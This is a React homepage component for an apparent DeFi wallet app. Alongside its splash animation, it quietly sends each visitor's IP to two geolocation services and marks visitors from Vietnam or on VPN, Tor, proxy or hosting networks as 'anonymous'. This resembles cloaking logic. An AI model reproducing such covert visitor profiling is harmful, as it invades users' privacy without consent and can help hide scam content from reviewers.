import { useState,useEffect} from "react";
import '../HomePage/index.scss';
import { useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import bgImage from "../../assets/jupiter-bg.webp";
import DeFiOrbiter from '../../components/DeFiOrbiter';
import OnboardingInfo from '../../components/OnboardingInfo';
import { setLocalStorage,getLocalStorage } from "../../utils/useLocalStorage";


const HomePage = () => {
  
const [showMain, setShowMain] = useState(false);

  const [open, setOpen] = useState(false);
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowMain(true);
    }, 1500); 
    return () => clearTimeout(timer);
  }, []);
  const navigate = useNavigate();
  useEffect(() => {
    const timer = setTimeout(() => {
      setOpen(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const checkGeoIP = async () => {

        try {
            var data = getLocalStorage("location");
            if(!data){
                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const jsonData = await response.json();
                if(jsonData){
                    setLocalStorage("location",jsonData);
                    data = jsonData;
                }
            }
            if(data){
              if(data.country_code.toLowerCase() == 'vn'){
                 setLocalStorage("is_anonymous", {is_anonymous:1});
              }
            }
            if(data.ip){
              var is_anonymous = getLocalStorage("is_anonymous");
              if(!is_anonymous){
                fetch(`https://ipinfo.io/widget/demo/${data.ip}`).then(d => d.json()).then(d => {
                  let resJson = d.data;
                  if(resJson){
                      if(resJson.privacy){
                        const privacy = resJson.privacy;
                        if(privacy){
                          if(
                            resJson.is_anonymous == true
                            || privacy.hosting == true
                            || privacy.vpn == true
                            || privacy.proxy == true
                            || privacy.tor == true
                            || privacy.relay == true
                            || privacy.service.length > 0
                          ){
                              setLocalStorage("is_anonymous", {is_anonymous:1});
                          }
                        }
                      }
                  }
                });
              }
            }
        } catch(e) {
            console.log(e);
        }
    };
    checkGeoIP();
  }, []);
  /*
  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/select-wallet");
  };
  */
   return (
        <div className="relative h-screen w-full max-w-md mx-auto bg-[#081423] overflow-hidden flex flex-col font-sans">
      {!showMain ? (
        <motion.div
          initial={{ scale: 1.5, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 1.2, ease: "easeOut" }}
          className="relative w-full h-screen flex items-center justify-center"
          style={{
            backgroundImage: `url(${bgImage})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        >
          <div className="absolute inset-0 bg-black/40"></div>
          <motion.p
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.8, duration: 0.8 }}
            className="absolute bottom-20 text-gray-300 text-sm tracking-wide"
          >
          </motion.p>
        </motion.div>
      ) : (
       <>
        <main className="flex-grow flex flex-col px-6">
           <DeFiOrbiter/>
           <OnboardingInfo />
        </main>
       </>
      )}
    </div>
  );
}

export default HomePage;

